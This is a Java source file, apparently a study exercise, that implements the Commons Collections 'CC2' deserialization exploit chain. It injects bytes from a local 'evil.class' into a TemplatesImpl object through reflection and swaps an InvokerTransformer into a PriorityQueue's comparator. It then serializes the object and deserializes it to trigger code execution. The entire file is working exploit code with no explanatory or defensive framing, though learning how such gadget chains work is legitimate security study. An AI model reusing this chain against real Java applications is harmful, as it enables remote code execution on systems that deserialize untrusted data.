package cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.PriorityQueue;

public class CC2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field fieldname = templatesClass.getDeclaredField("_name");
        fieldname.setAccessible(true);
        fieldname.set(templates, "aaa");
        Field bytecodesclass = templatesClass.getDeclaredField("_bytecodes");
        bytecodesclass.setAccessible(true);

        byte[] bytes = Files.readAllBytes(Paths.get("E:\\seecode\\FristTest\\target\\classes\\CC\\evil.class"));
        String encode = Base64.getEncoder().encodeToString(bytes);
        byte[] code = Base64.getDecoder().decode(encode);
        byte[][] codes = {code};
        bytecodesclass.set(templates, codes);

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);
        Class transformingComparatorClass = transformingComparator.getClass();
        Field field = transformingComparatorClass.getDeclaredField("transformer");
        field.setAccessible(true);
        field.set(transformingComparator, invokerTransformer);
        SerializableTest.searilze(priorityQueue, "cc2.bin");
        SerializableTest.unzearilze("cc2.bin");
    }
}
